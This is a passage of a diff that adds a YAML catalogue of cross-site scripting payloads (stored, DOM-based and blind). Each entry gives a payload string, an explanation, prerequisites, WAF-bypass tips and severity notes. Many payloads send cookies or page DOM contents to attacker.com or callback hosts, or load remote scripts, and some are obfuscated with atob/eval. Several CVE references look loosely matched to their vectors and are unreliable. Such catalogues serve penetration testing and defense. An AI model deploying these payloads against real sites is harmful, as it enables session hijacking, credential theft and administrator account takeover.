+      If application JavaScript later reads window.x or document.x expecting a string or safe value, it instead gets a reference
+      to this anchor element. If that reference is used in a context like eval() or assigned to innerHTML, the javascript:
+      href executes. This is an indirect stored XSS that requires JavaScript to consume the clobbered reference.
+
+      '
+    prerequisites:
+    - Application JavaScript reads named DOM element as a value
+    - id attribute not stripped by sanitizer
+    waf_bypass_notes: No obvious XSS keywords; bypasses many sanitizers
+    severity_context: CVSS 6.1 – indirect execution via DOM clobbering
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - stored
+    - dom-clobbering
+    - indirect-xss
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-011
+    title: XSS via stored file name
+    payload_string: '"><img src=x onerror=alert(1)>.jpg'
+    how_it_works: 'When a file''s original name is stored and then displayed in an HTML context (such as an upload confirmation
+      page or file listing), an attacker can craft a filename containing XSS. The .jpg extension helps evade upload type checks
+      while the leading payload breaks out of any enclosing attribute. File names are frequently overlooked as XSS vectors
+      because developers focus on file content rather than metadata. This payload fires when the filename is rendered in a
+      page.
+
+      '
+    prerequisites:
+    - File names stored and rendered in HTML without encoding
+    - Upload accepts files with crafted names
+    waf_bypass_notes: Filename is metadata; often not scanned by WAF body inspection
+    severity_context: CVSS 6.1 – stored XSS via file metadata
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - stored
+    - filename-injection
+    - file-upload
+    - metadata-xss
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-012
+    title: Admin panel XSS via user-supplied data
+    payload_string: <script>new Image().src='https://attacker.com/?'+document.cookie</script>
+    how_it_works: 'User-supplied data such as names, descriptions, or error messages that appear in admin panels represent
+      a high-value stored XSS target. When an administrator views the affected content, the script executes with the admin''s
+      session context. This Image-based exfiltration technique creates an img element and sets its src to trigger an HTTP
+      GET request to the attacker''s server, appending session cookies. Admin sessions typically carry the highest privilege
+      level.
+
+      '
+    prerequisites:
+    - User input displayed in admin panel without encoding
+    - Session cookie not HttpOnly
+    waf_bypass_notes: Image.src exfiltration avoids fetch/XMLHttpRequest CSP restrictions
+    severity_context: CVSS 9.1 – admin session takeover via stored payload
+    cve_refs: []
+    tags:
+    - stored
+    - admin-panel
+    - session-hijack
+    - high-impact
+    - persistent
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-013
+    title: XSS via HTTP response header injection
+    payload_string: "injected\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"
+    how_it_works: 'HTTP response header injection (also called CRLF injection) occurs when user input is placed in response
+      headers without stripping carriage return and line feed characters. An attacker injects CRLF sequences to add new headers
+      or a double CRLF to inject a response body. By overwriting the Content-Type to text/html and adding a body with a script
+      tag, arbitrary HTML/JavaScript is delivered to the browser. This can also be used to set cookies or poison cached responses.
+
+      '
+    prerequisites:
+    - User input reflected in HTTP response headers
+    - No CRLF stripping on input
+    waf_bypass_notes: Use %0d%0a or %0D%0A URL encoding for CR/LF characters
+    severity_context: CVSS 7.4 – response injection leading to XSS and cookie poisoning
+    cve_refs: []
+    tags:
+    - stored
+    - crlf-injection
+    - header-injection
+    - response-splitting
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-014
+    title: Template literal injection in JS context
+    payload_string: ${alert(1)}
+    how_it_works: 'When user input is embedded inside a JavaScript template literal (backtick string) on the server side without
+      escaping, the ${} expression syntax executes arbitrary JavaScript. This is a JavaScript context XSS rather than an HTML
+      context injection. It occurs in server-side templating or client-side code where values are interpolated into template
+      literals. The payload is compact and does not require HTML special characters, allowing it to bypass HTML-focused sanitizers.
+
+      '
+    prerequisites:
+    - Input reflected inside JavaScript template literal backtick string
+    - Template literal not escaped server-side
+    waf_bypass_notes: No HTML characters required; bypasses HTML-focused WAF rules
+    severity_context: CVSS 6.1 – JavaScript context injection via template literal
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - stored
+    - js-context
+    - template-literal
+    - javascript-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-015
+    title: XSS via Content-Type sniffing
+    payload_string: <script>alert(document.cookie)</script>
+    how_it_works: 'When a file upload is served without an explicit Content-Type header or with Content-Type: application/octet-stream,
+      Internet Explorer and older browsers perform MIME type sniffing. If the file content looks like HTML (contains <html>
+      or <script> tags), the browser renders it as HTML, executing scripts. This is stored XSS via MIME sniffing. Modern browsers
+      respect X-Content-Type-Options: nosniff to prevent this, but many legacy and enterprise applications omit this header.
+
+      '
+    prerequisites:
+    - Server does not set Content-Type correctly for uploaded files
+    - 'X-Content-Type-Options: nosniff header absent'
+    - Browser performs MIME sniffing (IE, legacy browsers)
+    waf_bypass_notes: Disguise as legitimate file type; rename to image.jpg
+    severity_context: CVSS 6.1 – MIME sniffing stored XSS via upload
+    cve_refs: []
+    tags:
+    - stored
+    - mime-sniffing
+    - file-upload
+    - content-type
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-016
+    title: Stored XSS in HTTP referer header
+    payload_string: <script>alert(1)</script>
+    how_it_works: 'Some applications log and display the HTTP Referer header in admin interfaces, analytics dashboards, or
+      error pages. An attacker can craft a request with a Referer header containing an XSS payload. If this value is stored
+      in a database and later rendered in an HTML context without encoding, it triggers stored XSS for any administrator who
+      views the log. Referer values are not typically considered user input and may bypass input validation focused on form
+      fields.
+
+      '
+    prerequisites:
+    - Application logs and renders Referer header
+    - Log display page does not encode output
+    waf_bypass_notes: Referer header may bypass WAF rules targeting form parameters
+    severity_context: CVSS 7.5 – stored XSS via HTTP header in admin log view
+    cve_refs: []
+    tags:
+    - stored
+    - http-header
+    - referer
+    - log-injection
+    - admin-panel
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-017
+    title: "Stored XSS via htmlspecialchars ENT_COMPAT single-quote bypass"
+    payload_string: "' onmouseover='alert(document.cookie)"
+    how_it_works: >
+      PHP's htmlspecialchars() function encodes <, >, &, and double-quote characters by default
+      (ENT_COMPAT mode). It does NOT encode single quotes unless ENT_QUOTES is specified.
+      When an application stores user input and reflects it inside a single-quoted HTML attribute
+      value — for example <input value='[user_input]'> — the leading single quote in the payload
+      closes the attribute, and the injected onmouseover handler executes when the victim hovers
+      over the element. Any user who loads the page triggers the stored XSS without a click.
+      Affected code pattern: echo "<input value='" . htmlspecialchars($input) . "'>".
+    prerequisites:
+      - Application uses htmlspecialchars() without ENT_QUOTES flag
+      - User-controlled data reflected inside single-quoted HTML attribute value
+    waf_bypass_notes: >
+      Single-quote payloads bypass WAF rules that block angle brackets and double-quote injection.
+      Some WAFs do not flag event-handler keywords (onmouseover, onfocus) inside attribute values.
+      URL-encode the single quote as %27 to bypass URL-pattern filters.
+    severity_context: "CVSS 6.1 – stored XSS via encoding gap; affects PHP applications using default htmlspecialchars flags"
+    cve_refs: []
+    tags:
+      - stored
+      - htmlspecialchars
+      - php
+      - ent-compat
+      - single-quote
+      - attribute-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: dom-based
+  name: DOM-based XSS
+  description: The vulnerability exists entirely in client-side JavaScript that reads from attacker-controllable sources (location.hash,
+    document.referrer) and writes to dangerous sinks (innerHTML, eval).
+  difficulty: high
+  prerequisites:
+  - Client-side JavaScript reads from a tainted source
+  - Tainted data flows to a dangerous sink without sanitization
+  payloads:
+  - id: xss-dom-001
+    title: Hash fragment innerHTML sink
+    payload_string: '#<img src=x onerror=alert(1)>'
+    how_it_works: 'If JavaScript reads location.hash and assigns it to an element''s innerHTML, anything in the URL fragment
+      becomes HTML in the DOM. The hash is never sent to the server, making this XSS invisible to server-side logs and WAFs.
+      The attacker crafts a URL with this hash value and sends it to a victim. The victim''s browser executes the img onerror
+      payload. This is a purely client-side attack with no server interaction required.
+
+      '
+    prerequisites:
+    - JavaScript assigns location.hash to innerHTML
+    - No sanitization of hash value
+    waf_bypass_notes: Hash fragment not visible to server or WAF; undetectable server-side
+    severity_context: CVSS 6.1 – client-side only, invisible to server logs
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - dom-based
+    - location-hash
+    - innerhtml-sink
+    - waf-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-002
+    title: document.write with location.search
+    payload_string: ?q=<script>alert(1)</script>
+    how_it_works: 'When JavaScript uses document.write() with data from location.search (the URL query string), the written
+      content is parsed as HTML by the browser. document.write operates during page load and can modify the document stream,
+      making injected script tags execute immediately. Because document.write is a synchronous DOM sink, there is no opportunity
+      for async sanitization. This pattern is common in older web analytics and search result pages.
+
+      '
+    prerequisites:
+    - JavaScript calls document.write() with location.search data
+    - No output encoding applied to query string data
+    waf_bypass_notes: WAF may block obvious payloads; use double encoding or DOM fragments
+    severity_context: CVSS 6.1 – DOM write sink in legacy JavaScript pattern
+    cve_refs: []
+    tags:
+    - dom-based
+    - document-write
+    - location-search
+    - legacy
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-003
+    title: eval() with postMessage data
+    payload_string: alert(1)
+    how_it_works: 'When a page receives postMessage events and passes the message data to eval() without origin verification,
+      any page on the internet can send malicious messages. An attacker opens the vulnerable page in an iframe or popup, then
+      sends a postMessage containing JavaScript code. The vulnerable page''s message handler evaluates it, executing in the
+      target page''s origin. Missing origin checks in addEventListener(''message'') handlers is the root cause.
+
+      '
+    prerequisites:
+    - Page has addEventListener('message') that passes data to eval() or innerHTML
+    - No origin check (event.origin not validated)
+    waf_bypass_notes: Attack originates from attacker page; no HTTP request to target server
+    severity_context: CVSS 7.4 – cross-origin code execution via postMessage abuse
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - dom-based
+    - postmessage
+    - eval-sink
+    - cross-origin
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-004
+    title: jQuery html() sink
+    payload_string: ?msg=<img src=x onerror=alert(1)>
+    how_it_works: 'jQuery''s .html() method sets innerHTML directly without sanitization. When applications use $(selector).html(location.search.substring(5))
+      or similar patterns to display URL parameters in the page, the parameter becomes an HTML sink. This is extremely common
+      in jQuery-heavy legacy applications. The img onerror fires immediately upon insertion. Any jQuery version below 3.5.0
+      is particularly vulnerable to this pattern.
+
+      '
+    prerequisites:
+    - Application uses jQuery .html() with URL parameter data
+    - jQuery version below 3.5.0 or no additional sanitization
+    waf_bypass_notes: Client-side jQuery sink; server-side WAF may not inspect this vector
+    severity_context: CVSS 6.1 – jQuery DOM sink XSS, very common in legacy apps
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - dom-based
+    - jquery
+    - html-sink
+    - legacy
+    - common
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-005
+    title: Angular template injection (client-side)
+    payload_string: '{{constructor.constructor(''alert(1)'')()}}'
+    how_it_works: 'AngularJS template injection occurs when user input is placed inside Angular template expressions without
+      sanitization. The double curly brace syntax evaluates as an Angular expression. By accessing the constructor property
+      chain, an attacker can obtain the Function constructor and call it with arbitrary JavaScript, bypassing Angular''s sandbox.
+      This affects AngularJS (1.x) applications where template expressions are evaluated client-side. Multiple sandbox escapes
+      exist for different AngularJS versions.
+
+      '
+    prerequisites:
+    - Application uses AngularJS (1.x) template expressions
+    - User input injected into Angular-controlled HTML
+    waf_bypass_notes: Angular-specific; bypass varies by version; see dedicated SSTI payloads
+    severity_context: CVSS 7.4 – Angular sandbox escape leading to JavaScript execution
+    cve_refs: []
+    tags:
+    - dom-based
+    - angularjs
+    - template-injection
+    - sandbox-escape
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-006
+    title: location.href assignment sink
+    payload_string: javascript:alert(1)
+    how_it_works: 'When JavaScript assigns a user-controlled value to location.href or window.location, a javascript: URI
+      causes the browser to evaluate the URI as code. This happens in applications that redirect users to a URL parameter
+      value (e.g., redirect_to= parameters) using client-side JavaScript. The attack requires no HTML injection — only control
+      over the value assigned to the location sink. This is also relevant for open redirect chains that include client-side
+      location assignment.
+
+      '
+    prerequisites:
+    - JavaScript assigns URL parameter to location.href without validation
+    - 'javascript: scheme not filtered'
+    waf_bypass_notes: 'Use &#106;avascript: or java%0ascript: to bypass string checks'
+    severity_context: 'CVSS 6.1 – javascript: URI via location assignment sink'
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - dom-based
+    - location-href
+    - javascript-uri
+    - redirect-sink
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-007
+    title: setTimeout/setInterval string argument
+    payload_string: ?callback=alert(1)
+    how_it_works: 'setTimeout() and setInterval() accept a string as their first argument, which is evaluated as JavaScript
+      (equivalent to eval). If application code passes a URL parameter to these functions as a string, arbitrary JavaScript
+      executes. This pattern is used in legacy callback-based APIs and polling mechanisms. The vulnerability behaves like
+      an eval() sink and allows full JavaScript execution in the page''s origin context.
+
+      '
+    prerequisites:
+    - Application passes URL parameter to setTimeout() or setInterval() as a string
+    - No input sanitization
+    waf_bypass_notes: setTimeout string argument is eval-equivalent; not always flagged
+    severity_context: CVSS 6.1 – eval-equivalent DOM sink via timer function
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - dom-based
+    - settimeout
+    - eval-equivalent
+    - callback-abuse
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-008
+    title: Prototype pollution to DOM XSS
+    payload_string: __proto__[innerHTML]=<img src=x onerror=alert(1)>
+    how_it_works: 'Prototype pollution vulnerabilities allow attackers to add properties to JavaScript''s Object.prototype.
+      If application code later calls innerHTML on an object derived from the polluted prototype (e.g., element[tainted_key]
+      = value), the polluted innerHTML property causes XSS. This is an indirect DOM XSS where the initial injection is via
+      prototype pollution and the XSS sink is triggered by normal application code flow. It is a sophisticated multi-step
+      attack requiring prototype pollution as a prerequisite.
+
+      '
+    prerequisites:
+    - Application has a prototype pollution vulnerability
+    - Code path later uses a polluted property as a DOM sink
+    waf_bypass_notes: Requires prototype pollution chain; high sophistication
+    severity_context: CVSS 7.4 – prototype pollution gadget chain leading to XSS
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - dom-based
+    - prototype-pollution
+    - gadget-chain
+    - advanced
+    - indirect
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-009
+    title: Open redirect to DOM XSS via referrer
+    payload_string: https://victim.com/redirect?url=https://attacker.com/xss.html
+    how_it_works: 'Some applications read document.referrer to redirect or display content after a navigation. An attacker
+      can craft a page on attacker.com that reads the referrer and uses it as an XSS payload. If victim.com reads document.referrer
+      and passes it to an unsafe sink, the attacker page''s URL becomes the referrer. This two-step attack chains an open
+      redirect with DOM XSS. The attacker first sends the victim to their page then redirects to the vulnerable referrer-reading
+      page.
+
+      '
+    prerequisites:
+    - Page reads document.referrer and uses it in unsafe sink
+    - Attacker can control referrer (typically via open redirect chain)
+    waf_bypass_notes: Referrer-based DOM XSS is rarely in WAF rules
+    severity_context: CVSS 5.4 – two-step referrer-based DOM XSS
+    cve_refs:
+    - CVE-2015-9251
+    tags:
+    - dom-based
+    - referrer
+    - redirect-chain
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-010
+    title: WebSocket message DOM XSS
+    payload_string: <script>alert(1)</script>
+    how_it_works: 'WebSocket applications that receive messages and insert them directly into the DOM using innerHTML or outerHTML
+      are vulnerable to DOM XSS via WebSocket injection. If an attacker can inject messages into the WebSocket stream (via
+      MITM on non-WSS connections, or via a malicious WebSocket server in SSRF chains), they can deliver XSS payloads to all
+      connected clients. This is a high-impact vector in real-time applications like chats or live dashboards.
+
+      '
+    prerequisites:
+    - WebSocket messages inserted into DOM via innerHTML
+    - Attacker can inject into WebSocket stream (ws:// or via server compromise)
+    waf_bypass_notes: WebSocket traffic may not be inspected by WAF
+    severity_context: CVSS 8.3 – DOM XSS affecting all connected WebSocket clients
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - dom-based
+    - websocket
+    - real-time
+    - multi-victim
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-011
+    title: Cookie value DOM XSS
+    payload_string: <img src=x onerror=alert(1)>
+    how_it_works: 'When client-side JavaScript reads a cookie value and places it into an unsafe DOM sink such as innerHTML,
+      an attacker who can set cookies (via a subdomain, MITM, or XSS chain) can trigger DOM XSS. This is particularly relevant
+      when cookies set by subdomains are readable by the main domain. The attack chain involves first setting a malicious
+      cookie value and then waiting for the JavaScript to read and render it.
+
+      '
+    prerequisites:
+    - JavaScript reads a cookie and inserts its value into innerHTML
+    - Attacker can set cookies on the domain or subdomain
+    waf_bypass_notes: Cookie source is not a typical WAF inspection point
+    severity_context: CVSS 6.1 – cookie-based DOM XSS
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - dom-based
+    - cookie-source
+    - innerhtml-sink
+    - subdomain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-012
+    title: localStorage DOM XSS
+    payload_string: <img src=x onerror=alert(document.cookie)>
+    how_it_works: 'If an application stores user-controlled data in localStorage and later reads it back into an unsafe DOM
+      sink, an attacker who achieves any XSS (even low-impact) can plant a persistent payload in localStorage. On subsequent
+      visits, the application reads the malicious value and executes it via innerHTML or similar. This creates a persistent
+      self-healing XSS that survives page refreshes and new sessions, effectively turning a reflected XSS into a stored-like
+      persistent XSS.
+
+      '
+    prerequisites:
+    - Application stores data in localStorage from user input
+    - localStorage value later read into unsafe DOM sink
+    waf_bypass_notes: localStorage source bypasses all server-side inspection
+    severity_context: CVSS 7.4 – persistent client-side storage to DOM XSS
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - dom-based
+    - localstorage
+    - persistent
+    - self-healing
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-013
+    title: document.referrer injection
+    payload_string: <script>alert(1)</script>
+    how_it_works: 'Applications that display ''You came from: [referrer]'' messages by reading document.referrer and inserting
+      it into innerHTML are vulnerable. An attacker crafts an HTML page on an attacker-controlled domain that contains a script
+      tag payload as part of the URL path or query, then places a link to the vulnerable page. When the victim navigates from
+      the attacker''s page, document.referrer contains the malicious URL which is then executed via innerHTML. The payload
+      must survive URL-encoding of the referrer value.
+
+      '
+    prerequisites:
+    - Application reads document.referrer into innerHTML
+    - Referrer URL contains XSS payload
+    waf_bypass_notes: Referrer header is rarely WAF-inspected for XSS
+    severity_context: CVSS 5.4 – referrer source DOM XSS
+    cve_refs:
+    - CVE-2015-9251
+    tags:
+    - dom-based
+    - referrer-source
+    - innerhtml-sink
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-014
+    title: JSON.parse eval gadget
+    payload_string: '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
+    how_it_works: 'Some implementations use JSON.parse on user input and then spread or merge the result into objects. If
+      the parsed JSON is merged using a vulnerable Object.assign or similar and later properties from that object are used
+      as innerHTML values, a prototype pollution chain leads to DOM XSS. The __proto__ key in JSON poisons Object.prototype''s
+      innerHTML, which is then used by application code as a DOM insertion method.
+
+      '
+    prerequisites:
+    - Application parses user JSON and merges to objects without filtering __proto__
+    - Application code uses innerHTML from merged object properties
+    waf_bypass_notes: JSON body may not be inspected for HTML content by WAF
+    severity_context: CVSS 7.4 – JSON prototype pollution to DOM XSS
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - dom-based
+    - json-parse
+    - prototype-pollution
+    - advanced
+    - gadget
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-dom-015
+    title: createElementNS namespace confusion
+    payload_string: data:text/html,<script>alert(1)</script>
+    how_it_works: 'When application code creates elements using createElementNS with incorrect namespace URIs, or when data:
+      URIs are used as src/href for navigable elements without restriction, browsers may render the data URI as HTML, executing
+      embedded scripts. Navigation to data: URIs from the page context can inherit the page''s origin in some browsers or
+      create a new context. This is an advanced technique targeting specific browser behaviors around namespace and URI scheme
+      handling.
+
+      '
+    prerequisites:
+    - 'Application uses data: URIs in navigable contexts'
+    - 'Browser does not enforce strict data: URI sandboxing'
+    waf_bypass_notes: 'data: URI scheme; unusual vector often missed by WAF'
+    severity_context: CVSS 5.4 – data URI XSS via namespace confusion
+    cve_refs: []
+    tags:
+    - dom-based
+    - data-uri
+    - namespace-confusion
+    - browser-specific
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: blind
+  name: Blind XSS
+  description: Payload fires in a different, unseen context (admin panel, backend tool) from where it was injected, requiring
+    out-of-band callback infrastructure to detect execution.
+  difficulty: high
+  prerequisites:
+  - Input stored and rendered in a different application context
+  - Attacker has OOB callback infrastructure (XSSHunter, Burp Collaborator)
+  payloads:
+  - id: xss-blind-001
+    title: XSSHunter callback payload
+    payload_string: '"><script src=https://YOUR_ID.xss.ht></script>'
+    how_it_works: 'XSSHunter is a service that hosts JavaScript payloads and captures execution context when they fire, including
+      URL, cookies, DOM snapshot, and IP address. By injecting a script tag loading from XSSHunter into a field that may be
+      viewed in a backend system, the attacker receives a notification with full context when any user (including administrators)
+      views the stored payload. This is invaluable for identifying blind XSS in ticketing systems, logging platforms, and
+      admin interfaces.
+
+      '
+    prerequisites:
+    - XSSHunter account configured with callback domain
+    - Target stores and renders input in another context
+    waf_bypass_notes: Use HTTPs and obfuscate the src parameter if WAF inspects scripts
+    severity_context: CVSS 8.8 – admin/backend context XSS with full session capture
+    cve_refs: []
+    tags:
+    - blind
+    - xsshunter
+    - oob
+    - admin-context
+    - persistent
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-002
+    title: Burp Collaborator blind XSS callback
+    payload_string: <script>new Image().src='https://BURP_COLLAB.burpcollaborator.net?'+document.cookie</script>
+    how_it_works: 'Burp Collaborator provides unique subdomains that log all incoming DNS lookups and HTTP requests. Injecting
+      a payload that triggers an HTTP request to a Collaborator domain upon execution proves that XSS fired in an unseen context.
+      Appending document.cookie captures the session context of whoever triggered it. The Collaborator panel shows the timestamp,
+      origin IP, and any data sent in the request, confirming blind XSS execution even in admin panels the tester cannot directly
+      access.
+
+      '
+    prerequisites:
+    - Burp Suite Professional with Collaborator enabled
+    - Target context makes external HTTP requests on script execution
+    waf_bypass_notes: Use DNS-only callback if HTTP is blocked by backend firewall
+    severity_context: CVSS 8.8 – session capture in blind context via OOB
+    cve_refs: []
+    tags:
+    - blind
+    - burp-collaborator
+    - oob
+    - dns-exfil
+    - professional-tool
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-003
+    title: Blind XSS via User-Agent header
+    payload_string: '"><script src=https://attacker.com/blind.js></script>'
+    how_it_works: 'The User-Agent header is frequently logged and displayed in analytics dashboards, access log viewers, and
+      support tools without HTML encoding. An attacker sends a request with a crafted User-Agent containing an XSS payload.
+      When a developer or administrator views the logs in a web-based log viewer, the payload fires with their session privileges.
+      This is a classic blind XSS vector that bypasses application input validation on form fields entirely.
+
+      '
+    prerequisites:
+    - Application logs User-Agent and renders it in web-based log viewer
+    - Log viewer does not HTML-encode User-Agent values
+    waf_bypass_notes: User-Agent field rarely inspected by application WAF for XSS
+    severity_context: CVSS 8.8 – blind XSS in admin log viewer via HTTP header
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - blind
+    - user-agent
+    - http-header
+    - log-injection
+    - admin-panel
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-004
+    title: Blind XSS via contact form
+    payload_string: <svg/onload=fetch('https://attacker.com/?'+btoa(document.cookie))>
+    how_it_works: 'Contact forms are high-value blind XSS injection points because their contents are rendered in email clients
+      and web-based ticketing systems. If the ticketing system or email viewer renders HTML without sanitization, the SVG
+      onload fires when support staff views the ticket. Using fetch with btoa encoding ensures the full cookie is exfiltrated
+      even if special characters would break simpler payload strings. Support staff often have elevated privileges making
+      this a high-impact attack.
+
+      '
+    prerequisites:
+    - Contact form submissions rendered in HTML-capable ticketing or email system
+    - Ticketing system does not sanitize HTML in messages
+    waf_bypass_notes: SVG-based payload; shorter and often less filtered than script tags
+    severity_context: CVSS 8.8 – support staff session capture via blind contact form XSS
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - blind
+    - contact-form
+    - ticketing-system
+    - support-staff
+    - high-impact
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-005
+    title: Blind XSS via HTTP X-Forwarded-For header
+    payload_string: '"><script src=https://attacker.com/x.js></script>'
+    how_it_works: 'The X-Forwarded-For header is used to pass client IP addresses through proxies and is often logged and
+      displayed in analytics, fraud detection, and admin IP tracking systems. Like User-Agent, it is rarely sanitized before
+      display. An attacker sending requests with this header set to an XSS payload will trigger blind XSS in any web-based
+      system that displays the IP address without encoding. This vector is particularly effective against internal tools that
+      are assumed to receive only trusted data.
+
+      '
+    prerequisites:
+    - X-Forwarded-For header stored and rendered in web-based admin/analytics tool
+    - No HTML encoding applied to header values
+    waf_bypass_notes: Custom headers typically bypass WAF parameter inspection
+    severity_context: CVSS 7.5 – blind XSS via IP tracking system
+    cve_refs: []
+    tags:
+    - blind
+    - x-forwarded-for
+    - http-header
+    - analytics
+    - admin-tool
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-006
+    title: Blind XSS with DOM snapshot exfiltration
+    payload_string: <script>var x=new XMLHttpRequest();x.open('POST','https://attacker.com/collect',true);x.send(JSON.stringify({url:location.href,cookies:document.cookie,dom:document.documentElement.innerHTML.substring(0,5000)}))</script>
+    how_it_works: 'This advanced blind XSS payload not only captures cookies but also exfiltrates the first 5000 characters
+      of the page''s DOM where execution occurred. This reveals the admin interface structure, other users'' data, CSRF tokens,
+      and API keys visible in the page. The POST request avoids query string length limits. JSON serialization handles special
+      characters. Combined with OOB infrastructure, this gives the attacker a complete snapshot of the privileged context
+      in which the XSS fired.
+
+      '
+    prerequisites:
+    - XSS fires in privileged backend context
+    - Backend context makes outbound HTTP POST requests
+    waf_bypass_notes: XMLHttpRequest POST to external domain; may be blocked by strict CSP
+    severity_context: CVSS 9.1 – full DOM/credential capture from privileged backend context
+    cve_refs: []
+    tags:
+    - blind
+    - dom-snapshot
+    - credential-capture
+    - advanced
+    - exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-007
+    title: Blind XSS via error message
+    payload_string: '"><img src=x onerror=eval(atob(''YWxlcnQoMSk=''))>'
+    how_it_works: 'Error messages displayed in admin dashboards and monitoring tools are often sourced from user input (usernames
+      in failed login attempts, invalid field values in form submissions). The payload uses atob() to base64-decode and eval()
+      the decoded string, providing simple obfuscation against string-matching filters. The base64 value decodes to alert(1)
+      in this example but can be replaced with any JavaScript. This pattern is effective against WAFs that scan for obvious
+      XSS keywords.
+
+      '
+    prerequisites:
+    - Error messages with user data rendered in admin monitoring interface
+    - Base64 decoding and eval() not blocked
+    waf_bypass_notes: atob/eval obfuscation bypasses keyword-based WAF scanning
+    severity_context: CVSS 7.5 – obfuscated blind XSS in error monitoring context
+    cve_refs: []
+    tags:
+    - blind
+    - base64-obfuscation
+    - eval-atob
+    - error-message
+    - waf-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-008
+    title: Blind XSS via filename in download tracker
+    payload_string: '"><script src=//attacker.com/x.js></script>.pdf'
+    how_it_works: 'Download tracking systems that log and display filenames in admin dashboards are vulnerable to blind XSS
+      via crafted filenames. An attacker uploads or requests a file with an XSS payload as the filename. The .pdf extension
+      helps pass upload validation while the XSS payload at the beginning fires when an admin views the download log. Admin
+      dashboards for download analytics are commonly built with minimal security hardening because they are considered internal
+      tools.
+
+      '
+    prerequisites:
+    - File download tracking system stores and renders filenames in admin view
+    - Admin download analytics dashboard does not encode filenames
+    waf_bypass_notes: Filename metadata; often outside WAF inspection scope
+    severity_context: CVSS 7.5 – admin dashboard XSS via download filename
+    cve_refs: []
+    tags:
+    - blind
+    - filename
+    - download-tracker
+    - admin-dashboard
+    - metadata
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-009
+    title: Blind XSS via DNS OOB callback in User-Agent
+    payload_string: '"><script>new Image().src="https://bxss.attacker.com/"+document.cookie</script>'
+    how_it_works: 'Out-of-band blind XSS leverages DNS or HTTP callbacks to confirm execution without requiring the attacker
+      to view the rendered page. Injecting a payload into the User-Agent header that is later displayed in a server analytics
+      or log viewer causes the payload to fire in the admin''s browser. The attacker''s server receives a DNS lookup or HTTP
+      request containing the victim''s cookies, confirming exploitation. This technique is particularly effective because
+      server logs and analytics panels rarely apply output encoding to stored User-Agent strings.
+
+      '
+    prerequisites:
+    - User-Agent or similar header value stored and rendered in an admin panel
+    - Attacker controls an external callback server (e.g., BurpCollaborator)
+    waf_bypass_notes: Header-based injection bypasses most form-field WAF rules
+    severity_context: CVSS 8.8 – Blind XSS via OOB callback leading to admin session theft
+    cve_refs: []
+    tags:
+    - blind
+    - oob
+    - user-agent
+    - header
+    - dns-callback
+    - admin
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-010
+    title: Blind XSS via img-src canary in referer header
+    payload_string: '><img src=x onerror="fetch(''https://bxss.attacker.com/?c=''+btoa(document.cookie))">'
+    how_it_works: 'The Referer header is often stored in web analytics, CDN access logs, or error-reporting dashboards, and
+      may be rendered without proper encoding in administrative interfaces. Injecting an img-src canary with an onerror handler
+      causes the payload to execute when an administrator views the access log or error report. Using btoa() encodes the cookie
+      value for reliable HTTP transport, allowing the attacker to exfiltrate session tokens even when special characters are
+      present. This approach is stealthier than alert()-based probes because it silently beacons rather than creating visible
+      side effects.
+
+      '
+    prerequisites:
